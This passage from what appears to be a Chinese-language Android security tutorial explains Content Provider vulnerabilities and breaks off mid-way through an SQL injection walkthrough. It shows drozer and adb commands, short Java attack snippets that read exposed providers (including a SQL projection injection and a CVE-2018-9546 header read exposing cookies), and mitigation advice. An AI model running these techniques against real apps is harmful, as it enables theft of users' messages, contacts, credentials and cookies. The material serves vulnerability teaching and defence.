
```java
getContentResolver().registerContentObserver(Uri.parse("content://com.ljq.providers.personprovider/person"),
true, new PersonObserver(new Handler()));
public class PersonObserver extends ContentObserver{
public PersonObserver(Handler handler) {
super(handler);
}
public void onChange(boolean selfChange) {
//to do something
}
}
```

### （6）Content Provider使用

![image-20210922094010216](upload/attach/202109/905443_ZG6RN43SA6TWTFN.png)

创建内容提供者的基本流程：

```java
（1）创建一个扩展ContentProviderbaseclass的 Content Provider 类
（2）定义将用于访问内容的内容提供者 URI 地址
（3）创建自己的数据库来保存内容。通常，Android 使用 SQLite 数据库，框架需要覆盖onCreate()方法，该方法将使用 SQLite Open Helper 方法创建或打开提供者的数据库。当您的应用程序启动时，其每个内容提供程序的onCreate()处理程序在主应用程序线程上被调用
（4）实现内容提供者查询以执行不同的数据库特定操作
（5）最后使用 <provider> 标签在您的活动文件中注册您的内容提供者
```

### 2.Content Provider漏洞的种类和危害

Content Provoder漏洞大致可以分为：

![image-20210922104352070](upload/attach/202109/905443_WHA5BS39WRBY5G3.png)

Content Provider漏洞的危害：

```java
Android中Content Provider起到在不同的进程APP之间实现共享数据的作用，通过Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。
Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作
而content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞
```

## 三、Content Provider漏洞原理分析和复现

### 1.漏洞挖掘方法

先检测组件的`exported`属性，再检测组件`permission`、`readPermission`、`writePermissio`对应的`protectionlevel`，最后再检测`sdk`版本

![image-20210922124628055](upload/attach/202109/905443_RY4WG2ZJZTBYSEB.png)

#### （1）查找导出Provider

```
（1）反编译 apk 文件，在AndroidManifest.xml中查找显示设置了android:exported="true"Content Provider
（2）使用drozer工具，执行命令：run app.provider.info -a ddns.android.vuls
```

#### （2）查找URI

- 反编译apk文件，在代码中查找`UriMatcher.addURI`，并手动拼接uri

![image-20210922125010622](upload/attach/202109/905443_6W34GAPGU7JFG7G.png)

如上，可以拼接出：

```java
content://ddns.vuls.AccountProvider/account
content://ddns.vuls.AccountProvider/account/
content://ddns.vuls.AccountProvider/account/1
content://ddns.vuls.AccountProvider/account/aaa
```

- 使用drozer工具

```java
执行命令 run app.provider.finduri ddns.android.vuls
```

#### （3）方法使用

```java
1.使用adb shell查询
例子：adb shell content query --uri 具体uri
2.使用drozer验证
例子：run app.provider.query "具体uri"
3.编写目标代码
例如：
private void getyouni(){
int i = 0;
ContentResolver contentresolver=getContentResolver();
String[] projection={"\* from contacts--"};
Uri uri =Uri.parse("content://com.snda.youni.providers.DataStructs/message\_ex");
Cursor cursor=contentresolver.query(uri.projection,null,null,null);
String text="";
while(cursor.moveToNext()){
text+=cursor.getString(cursor.getColumnIndex("display\_name"))+"\n";
}
Log.i("TEST",text);
}
```

我们下面将结合这三种方法来对一些常见的案例进行漏洞挖掘介绍

### 2.信息泄露漏洞

#### （1）原理介绍

```java
content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个，provider中的一个表，指向表的contentURI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。
```

#### （2）漏洞复现

**案例1：盛大有你Android存在信息泄露漏洞**

目标代码：

```xml
<provider android:name=".providers.YouNiProvider" android:process="com.snda.youni.mms" android:authorities="com.snda.youni.providers.DataStructs"/>
```

攻击代码：

```java
private void getyouni(){
int i = 0;
ContentResolver contentresolver=getContentResolver();
String[] projection={"\* from contacts--"};
Uri uri =Uri.parse("content://com.snda.youni.providers.DataStructs/message\_ex");
Cursor cursor=contentresolver.query(uri.projection,null,null,null);
String text="";
while(cursor.moveToNext()){
text+=cursor.getString(cursor.getColumnIndex("display\_name"))+"\n";
}
Log.i("TEST",text);
}
```

代码分析：

我们可以分析目标程序的provider的进程名和授权的的URI，我们可以根据授权的URI来构建一个URI，然后通过`contentresolver`去读取里面的的列表名信息，这样我们就可以获取APP中的隐私数据信息。

**案例2：样例sieve.apk**

我们先向apk中添加一条数据，然后保存：

![image-20210922111855304](upload/attach/202109/905443_VXGPFGX7458H6U7.png)

我们先使用drozer对内容提供器的路径进行扫描：

```
run scanner.provider.finduris -a <包名>
```

报错：drozer could not find or compile a required extension library

这是由于我们drozer2.7中代码导致的，我们需要修改相应的代码，参考网址(<mark class="encrypted">425K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6r3f1$3g2U0N6i4u0W2e0p5q4n7f1#2)9J5c8X3c8J5L8%4A6W2M7W2)9J5c8X3W2K6M7%4g2W2M7#2)9J5c8U0x3$3x3b7`.`.</mark> )

![image-20210922111855304](upload/attach/202109/905443_72WXQNG2AH4NGNZ.png)

![image-20210922111855304](upload/attach/202109/905443_AG83T36NF98JV36.png)

我们可以对敏感数据读取：

```
run app.provider.query uri
```

![image-20210922112523603](upload/attach/202109/905443_V79WY8BMC6YQV4Y.png)

我们就成功的将我们刚才保存的账号密码信息给获取了

案例3：<a href="elink@cf5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0j5h3u0A6L8U0l9H3y4q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9I4z5g2)9J5c8U0l9@1i4K6u0r3x3e0g2Q4x3V1k6m8L8X3c8J5L8$3W2V1i4K6u0V1c8r3!0%4L8X3I4G2j5h3c8Q4x3X3c8b7M7X3!0$3K9h3c8W2M7W2)9J5y4f1f1$3i4K6t1#2b7V1y4Q4x3U0f1^5c8W2)9J5y4f1f1$3i4K6t1#2b7U0c8Q4x3U0f1&6c8g2)9J5y4f1f1#2i4K6t1#2z5o6S2Q4x3U0f1^5y4W2)9J5y4f1f1$3i4K6t1#2z5f1g2Q4x3U0f1&6x3q4)9J5c8R3`.`.">CVE-2018-9546: Download Provider文件头信息泄露</a>

漏洞描述：

```java
Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。
```

目标代码：

```java
读取header的URI为：content://download/mydownloads/download\_id/headers
```

攻击代码：

```java
Uri uri = Uri.parse("content://download/mydownloads/1493/headers");
Cursor cur = res.query(uri, null, null, null, null);
try {
if (cur != null && cur.getCount() > 0) {
StringBuilder sb = new StringBuilder(LOG\_SEPARATOR);
sb.append("HEADERS FOR DOWNLOAD ID ").append(id).append("\n");
while (cur.moveToNext()) {
String rowHeader = cur.getString(cur.getColumnIndex("header"));
String rowValue = cur.getString(cur.getColumnIndex("value"));
sb.append(rowHeader).append(": ").append(rowValue).append("\n\n");
}
log(sb.toString());
}
} finally {
if (cur != null)
cur.close();
}
```

由于header的URI并未做一些防护措施，我们可以将download\_id取具体的值，然后来获取里面的具体信息

#### （3）安全防护

```java
1.minSdkVersion不低于9
2.不向外部app提供数据的私有content provider显示设置exported=”false”，避免组件暴露(编译api小于17时更应注意此点)
3.内部app通过content provid交换数据时，设置protectionLevel=”signature”验证签名
4.公开的content provider确保不存储敏感数据
针对权限保护绕过防御措施：
1.使用Context.checkCallingPermission()和Context.enforceCallingPermission()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。
2.可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。
```

### 3.SQL注入漏洞

#### （1）原理介绍

```java
对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击。
所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。
另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。
```

#### （2）漏洞复现

**案例1：<a href="elink@9baK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6&6i4K6u0W2P5X3!0F1k6g2)9J5k6h3y4A6i4K6u0r3j5Y4g2Y4i4K6g2X3k6r3g2@1j5h3W2D9i4K6u0W2M7r3S2H3i4K6y4r3N6%4W2T1N6h3N6Q4y4h3k6A6k6q4)9K6c8s2N6G2L8%4W2#2L8W2)9J5k6o6t1H3x3e0c8Q4x3X3b7H3z5o6j5^5z5e0V1`.">安全管家客户端存在SQL注入攻击</a>**

漏洞说明：

```java
Android版安全管家客户端contentprovider uri配置不当，导致sql注入，使得任何应用可不需要root权限下，获得和修改数据库中数据。
```

Androidmanifest文件中定义的provider：

![image-20210922112523603](upload/attach/202109/905443_QQYPPTH3VET8UDN.png)

使用drozer扫描客户端程序存在的contentProvider uri:

![image-20210922112523603](upload/attach/202109/905443_576HVQ5VDGAY5AJ.png)

搜索到对外暴露可访问的uri:

![image-20210922112523603](upload/attach/202109/905443_XPTEEQJ8BN3A4VT.png)

newapp.db结构：

![image-20210922112523603](upload/attach/202109/905443_RJYZJ474YDF527J.png)

查看新安装应用的包名：

![image-20210922112523603](upload/attach/202109/905443_WQYUCYAE8J6EYSH.png)

查看白名单：

![image-20210922112523603](upload/attach/202109/905443_DN6Z86UBSCGP9BE.png)

![image-20210922112523603](upload/attach/202109/905443_772CTM5JEPZV9BC.png)

**案例2：样本sieve**

我们使用drozer扫描注入的位置：

```
run scanner.provider.injection -a <包名>
```

![image-20210922112523603](upload/attach/202109/905443_N9SJUZPPWC5FVN4.png)

然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据
